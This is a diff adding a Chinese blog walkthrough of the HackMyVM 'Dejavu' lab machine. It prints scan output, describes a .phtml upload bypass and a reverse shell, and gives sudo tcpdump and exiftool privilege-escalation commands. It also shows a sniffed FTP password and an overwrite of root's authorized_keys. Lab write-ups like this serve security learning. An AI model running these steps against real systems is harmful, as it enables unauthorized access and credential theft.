@@ -3124,4 +3124,51 @@ flag4 在 C:\Users\Administrator\flag 下
         <tag>靶机</tag>
       </tags>
   </entry>
+  <entry>
+    <title>HackmyVM-Dejavu</title>
+    <url>/2025/04/29/HackmyVM-Dejavu/</url>
+    <content><![CDATA[信息搜集┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)192.168.31.2    08:00:27:8f:69:69       PCS Systemtechnik GmbH192.168.31.169  08:00:27:b7:b2:91       PCS Systemtechnik GmbH
+
+192.168.31.169就是靶机地址
+┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.169Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-28 22:42 EDTNmap scan report for 192.168.31.169Host is up (0.00087s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpMAC Address: 08:00:27:B7:B2:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds
+
+80端口┌──(root㉿kali)-[~/Desktop/tmp]└─# gobuster dir -u &quot;http://192.168.31.169/&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .txt,.php===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://192.168.31.169/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.6[+] Extensions:              php,txt[+] Timeout:                 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/info.php             (Status: 200) [Size: 69969]
+
+只能扫到一个info.php，是一个phpinfo页面，前端注释里有一个
+&lt;!-- /S3cR3t --&gt;
+
+访问/S3cR3t有一个upload.php,php后缀禁止上传，改后缀为phtml,有disable_function，可以用蚁剑的插件绕过disable_functions绕过
+反弹一个shell出来
+提权www-data@dejavu:/opt$ sudo -lMatching Defaults entries for www-data on dejavu:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser www-data may run the following commands on dejavu:    (robert) NOPASSWD: /usr/sbin/tcpdump
+
+可以无密码以robert执行tcpdump
+COMMAND=&#x27;id&#x27;TF=$(mktemp)echo &quot;$COMMAND&quot; &gt; $TFchmod +x $TFsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+
+但是提权的时候提示权限不够，只能另寻他路
+上传一个pspy64，监控进程
+2025/04/29 03:05:01 CMD: UID=1000  PID=1715   | /usr/sbin/CRON -f2025/04/29 03:05:01 CMD: UID=1000  PID=1716   | /bin/sh -c /home/robert/auth.sh2025/04/29 03:05:01 CMD: UID=1000  PID=1717   | /bin/sh /home/robert/auth.sh2025/04/29 03:05:01 CMD: UID=65534 PID=1719   | /usr/sbin/vsftpd /etc/vsftpd.conf2025/04/29 03:05:01 CMD: UID=0     PID=1718   | /usr/sbin/vsftpd /etc/vsftpd.conf2025/04/29 03:05:01 CMD: UID=1000  PID=1720   | /usr/sbin/vsftpd /etc/vsftpd.conf
+
+发现robert会运行auth.sh，还和ftp有关系，用tcpdump抓一下包看看
+www-data@dejavu:/tmp$ sudo -u robert /usr/sbin/tcpdump tcp port 21 -i lotcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes03:09:01.651819 IP localhost.51594 &gt; localhost.ftp: Flags [S], seq 1560518222, win 65495, options [mss 65495,sackOK,TS val 2363185351 ecr 0,nop,wscale 7], length 003:09:01.651828 IP localhost.ftp &gt; localhost.51594: Flags [S.], seq 206236889, ack 1560518223, win 65483, options [mss 65495,sackOK,TS val 2363185351 ecr 2363185351,nop,wscale 7], length 003:09:01.651835 IP localhost.51594 &gt; localhost.ftp: Flags [.], ack 1, win 512, options [nop,nop,TS val 2363185351 ecr 2363185351], length 003:09:01.652915 IP localhost.ftp &gt; localhost.51594: Flags [P.], seq 1:21, ack 1, win 512, options [nop,nop,TS val 2363185352 ecr 2363185351], length 20: FTP: 220 (vsFTPd 3.0.3)03:09:01.653039 IP localhost.51594 &gt; localhost.ftp: Flags [.], ack 21, win 512, options [nop,nop,TS val 2363185352 ecr 2363185352], length 003:09:01.653087 IP localhost.51594 &gt; localhost.ftp: Flags [P.], seq 1:14, ack 21, win 512, options [nop,nop,TS val 2363185352 ecr 2363185352], length 13: FTP: USER robert03:09:01.653089 IP localhost.ftp &gt; localhost.51594: Flags [.], ack 14, win 512, options [nop,nop,TS val 2363185353 ecr 2363185352], length 003:09:01.653260 IP localhost.ftp &gt; localhost.51594: Flags [P.], seq 21:55, ack 14, win 512, options [nop,nop,TS val 2363185353 ecr 2363185352], length 34: FTP: 331 Please specify the password.03:09:01.653312 IP localhost.51594 &gt; localhost.ftp: Flags [.], ack 55, win 512, options [nop,nop,TS val 2363185353 ecr 2363185353], length 003:09:01.653355 IP localhost.51594 &gt; localhost.ftp: Flags [P.], seq 14:32, ack 55, win 512, options [nop,nop,TS val 2363185353 ecr 2363185353], length 18: FTP: PASS 9737bo0hFx403:09:01.653357 IP localhost.ftp &gt; localhost.51594: Flags [.], ack 32, win 512, options [nop,nop,TS val 2363185353 ecr 2363185353], length 003:09:01.664382 IP localhost.ftp &gt; localhost.51594: Flags [P.], seq 55:78, ack 32, win 512, options [nop,nop,TS val 2363185364 ecr 2363185353], length 23: FTP: 230 Login successful.
+
+可以发现robert的密码是9737bo0hFx4,su切换用户
+robert@dejavu:/tmp$ sudo -lMatching Defaults entries for robert on dejavu:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser robert may run the following commands on dejavu:    (root) NOPASSWD: /usr/local/bin/exiftool
+
+exiftool可以写入任意文件，写个公钥即可
+LFILE=file_to_writeINPUT=input_filesudo exiftool -filename=$LFILE $INPUT
+
+robert@dejavu:/tmp$ sudo exiftool -filename=$LFILE $INPUTError: &#x27;/root/.ssh/authorized_keys&#x27; already exists - ./authorized_keys
+
+已经存在了，那就把这个公钥移动过来，在写公钥进去
+robert@dejavu:/tmp$ sudo exiftool -filename=./1 /root/.ssh/authorized_keysrobert@dejavu:/tmp$ sudo exiftool -filename=/root/.ssh/authorized_keys ./authorized_keys 
+
+然后ssh登录即可
+]]></content>
+      <categories>
+        <category>HackMyVM</category>
+      </categories>
+      <tags>
+        <tag>靶机</tag>
+      </tags>
+  </entry>
 </search>
